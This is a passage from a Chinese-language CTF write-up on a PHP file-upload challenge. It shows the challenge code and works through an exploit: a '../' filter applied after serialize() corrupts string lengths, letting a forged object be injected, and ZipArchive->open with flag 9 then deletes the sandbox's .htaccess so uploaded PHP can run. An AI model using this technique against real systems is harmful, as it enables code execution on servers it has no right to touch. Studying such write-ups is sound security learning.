                <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?action=home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据<code>i</code>值索引文件对象<code>UploadFile</code>，然后更改<code>fakename</code>的值，之后重新设置cookie重新序列化files。</p>
<ul>
<li>打开/open: （查看已上传文件的元数据）输出指定文件的fakename和realname信息</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">case</span> <span class="token string">'open'</span><span class="token punctuation">:</span>
        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span><span class="token punctuation">,</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        exit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过<code>i</code>值索引文件对象<code>UploadFile</code>，然后调用对象的<code>open</code>方法输出指定文件的元数据：<code>fakename和realname</code>信息。</p>
<ul>
<li>重置/reset: （删除特定沙盒中的所文件）清空特定的sandbox</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">case</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"$sandbox_dir/*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?action=home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过空数组设置新的cookie，然后删除<code>$sandbox_dir/</code>下的文件。</p>
<p>对于用户的操作，其中的每一个操作，都是在沙盒环境中执行的。这里的沙盒，是程序生成的用户专属文件夹，其生成代码如下：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sandbox_dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span><span class="token punctuation">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>该沙盒还可以防止PHP执行，以生成的.htaccess文件为例，我们可以看到其中的php_flag engine off指令：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">"php_flag engine off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>针对<code>UploadFile</code>类，在上传新文件时，将使用以下属性来创建UploadFile：</p>
<p>fakename：用户上传文件的原始文件名；</p>
<p>realname：自动生成的文件名，用于在磁盘上存储文件。</p>
<p>通过Open操作查看文件时，fakename用于文件名的显示，而在文件系统中所保存的文件，实际上其文件名为realname中的名称。</p>
<p>然后，会将UploadFile对象添加到数组，通过自定义的myserialize()函数对其进行序列化，并通过文件Cookie返回给用户。当用户想要查看文件时，Web应用程序会获取用户的Cookie，通过myunserialized()函数对UploadFile对象的数组反序列化，随后对其进行相应的处理。</p>
<p>下面是UploadFile对象的示例：</p>
<pre><code>a:2:{i:0;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:9:&quot;pictu.jpg&quot;;s:8:&quot;realname&quot;;s:44:&quot;3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg&quot;;}i:1;O:10:&quot;UploadFile&quot;:2:{s:8:&quot;fakename&quot;;s:7:&quot;qwe.jpg&quot;;s:8:&quot;realname&quot;;s:44:&quot;75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg&quot;;}}f96f37cca80ecae3c5f2f30be497c27024a23a24093e9e7a26c9721be025fb7b</code></pre><p>以下是用于生成上述序列化对象的相关代码：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span><span class="token string">"./"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">UploadFile</span> <span class="token punctuation">{</span>

    <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'.txt'</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span> <span class="token operator">=</span> <span class="token variable">$fakename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$analysis</span> <span class="token operator">=</span> <span class="token string">"$fakename is in folder $sandbox_dir/$realname."</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$analysis</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'open'</span><span class="token punctuation">:</span>
        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span><span class="token punctuation">,</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为每次建立sandbox的时候，都会在目录加上一个<code>.htaccess</code>文件来限制php的执行，因此我们无法直接上传shell。同时由于在序列化和反序列化的时候做了签名，我们也不能直接通过修改cookie的方式来改变对象。</p>
<p>由于源代码中没有wakeup()或destruct()这样的magic函数，因此我们不能使用常用的一些反序列化攻击方法。</p>
<p><strong>发现漏洞：破坏序列化对象</strong></p>
<p>随着继续的审计和探索，发现应用程序中的漏洞：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span><span class="token string">"./"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码的作者添加了一个<code>str_replace()</code>调用，用来过滤掉<code>../</code>序列。这就存在一个问题，<code>str_replace</code>调用是在一个序列化的对象上执行的，而不是一个字符串。</p>
<p>比如有这么一个序列化后的字符串</p>
<pre><code>php &gt; $array = array();
php &gt; $array[] = &quot;../&quot;;
php &gt; $array[] = &quot;hello&quot;;
php &gt; echo serialize($array);
a:2:{i:0;s:3:&quot;../&quot;;i:1;s:5:&quot;hello&quot;;}</code></pre><p>在myserialize函数（<code>../过滤器</code>）处理后就变成了</p>
<pre><code>php &gt; echo str_replace(&quot;../&quot;,&quot;./&quot;, serialize($array));
a:2:{i:0;s:3:&quot;./&quot;;i:1;s:5:&quot;hello&quot;;}</code></pre><p>通过过滤，确实已经将<code>“../”</code>改为了<code>“./”</code>，然而，序列化字符串的大小并没有改变。<code>s:3:”./“;</code>显示的字符串大小为3，然而实际上它的大小是2！!</p>
<p>当这个损坏的对象被unserialize()处理时，PHP会将序列化对象(<code>“</code>)中的下一个字符视为其值的一部分，而从这之后，反序列化就会出错：</p>
<pre><code>a:2:{i:0;s:3:&quot;./&quot;;i:1;s:5:&quot;hello&quot;;}
           ^  --- &lt;== The value parsed by unserialize() is ./&quot;</code></pre><p><strong>伪造任意对象并签名</strong></p>
<p>既然这样，那么如果合理控制../的数量，是不是就可以引入一个非法的对象呢</p>
<pre><code>php &gt; $array = array();
php &gt; $array[] = &quot;../../../../../../../../../../../../../&quot;;
php &gt; $array[] = &#39;A&quot;;i:1;s:8:&quot;Injected&#39;;
php &gt; echo serialize($array);
a:2:{i:0;s:39:&quot;../../../../../../../../../../../../../&quot;;i:1;s:20:&quot;A&quot;;i:1;s:8:&quot;Injected&quot;;}</code></pre><p>对于这个序列化的字符串，处理以后为：</p>
<pre><code>php &gt; $x = str_replace(&quot;../&quot;, &quot;./&quot;, serialize($array));
php &gt; echo $x;
a:2:{i:0;s:39:&quot;./././././././././././././&quot;;i:1;s:20:&quot;A&quot;;i:1;s:8:&quot;Injected&quot;;}
               ---------------------------------------           --------

php &gt; print_r(unserialize($x));
Array
(
    [0] =&gt; ./././././././././././././&quot;;i:1;s:20:&quot;A
    [1] =&gt; Injected
)</code></pre><p>这个时候，s:39对应的字符串变成了<code>./././././././././././././&quot;;i:1;s:20:&quot;A</code>，这样就把本来不应该有的Injected引入了进来。在这个例子中，使用的字符串是“i:1;s:8:”Injected”，但同样，任何基元/对象都可以在这里使用。</p>
<p>继续回到题目本身，情况与之几乎相同。我们需要的就是一个数组，该题中正是<code>UploadFile</code>对象数组，在这个数组中我们可以破坏第一个对象，从而控制第二个对象。</p>
<p>我们可以通过上传两个文件来实现漏洞的利用。就像上面的例子一样，我们具体操作如下：</p>
<ul>
<li><p>上传两个文件，创建两个VaultFile对象；</p>
</li>
<li><p>用部分序列化的对象，重命名第二个UploadFile对象中的fakename；</p>
</li>
<li><p>借助<code>../</code>序列，重命名第一个UploadFile对象中的fakename，使其到达第二个UploadFile对象。</p>
</li>
</ul>
<p>请注意，由于我们现在使用的是Web应用程序的正常功能来执行上述操作，所以就不用再考虑签名的问题，这些操作一定是合法的。</p>
<p>由于<code>myserialize</code>的问题，如果我们有一个可控点，就可以尝试引入非法的对象。这个可控点就是changename，changename会修改fakename的值同时重新序列化对象</p>
<p><strong>使用任意数据伪造序列化对象</strong></p>
<p>通过上面的探索，现在，就可以使用任意数据，来伪造我们自己的序列化对象。在这一步骤中，我们需要解决的是一个经典的对象注入问题，但在这里，并没有太多技巧或者捷径可以供我们使用。</p>
<p>到目前为止，我们几乎已经用到了应用中所有的功能，但还有一个没有用过，那就是Open。以下是Open的相关代码：</p>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fakename</span><span class="token punctuation">,</span> <span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>
        <span class="token variable">$analysis</span> <span class="token operator">=</span> <span class="token string">"$fakename is in folder $sandbox_dir/$realname."</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$analysis</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">case</span> <span class="token string">'open'</span><span class="token punctuation">:</span>
        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">myunserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span><span class="token punctuation">,</span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        exit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Open操作通过<code>i</code>索引会从$files数组中获取一个对象，并使用$object-&gt;fakename和$object-&gt;realname这两个参数来调用open()函数。</p>
<p>通过上面知道，可以在$files数组中注入任何对象（就像之前注入的“Injected”字符串一样）。但如果我们注入的不是UploadFile对象，会发生什么？</p>
<p>其实可以看到，open()这一方法名是非常常见的。如果我们能够在PHP中找到一个带有open()方法的标准类，那么就可以欺骗Web应用去调用这个类的open()方法，而不再调用UploadFile中的方法。</p>
<p>简单来看可以理解为下面的实例过程</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UploadFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以通过欺骗Web应用程序，来实现这一点，从而实现类的欺骗，调用其它类的相同方法：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SomeOtherFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fakename</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">realname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>既然可以这样操作那么下来就是要寻找有那些类包含open()方法，从而实现后续的利用</p>
<p>通过原WP，编写代码列出所有包含open()方法的类：</p>
<pre class="line-numbers language-php"><code class="language-php">$ cat list<span class="token punctuation">.</span>php
<span class="token delimiter">&lt;?php</span>
  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">==</span> <span class="token string">"open"</span><span class="token punctuation">)</span>
        <span class="token keyword">echo</span> <span class="token string">"$class->$methodn"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>列举结果：</p>
<pre class="line-numbers language-php"><code class="language-php">$ php list<span class="token punctuation">.</span>php
SQLite3<span class="token operator">-</span><span class="token operator">></span><span class="token property">open</span>
SessionHandler<span class="token operator">-</span><span class="token operator">></span><span class="token property">open</span>
XMLReader<span class="token operator">-</span><span class="token operator">></span><span class="token property">open</span>
ZipArchive<span class="token operator">-</span><span class="token operator">></span><span class="token property">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经过寻找，共发现有4个类带有open()方法。如果在$files数组中，注入这些类中任意一个的序列化对象，我们就可以通过带有特定参数的open动作，来调用这些类中的方法。</p>
<p>其中的大部分类都能够对文件进行操作。回到之前，我们知道<code>.htaccess</code>会在沙盒中阻止我们执行PHP。所以，假如能通过某种方式删掉<code>.htaccess</code>文件，那么就成功了。</p>
<p>通过对上面的4个类进行测试，发现，ZipArchive-&gt;open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。</p>
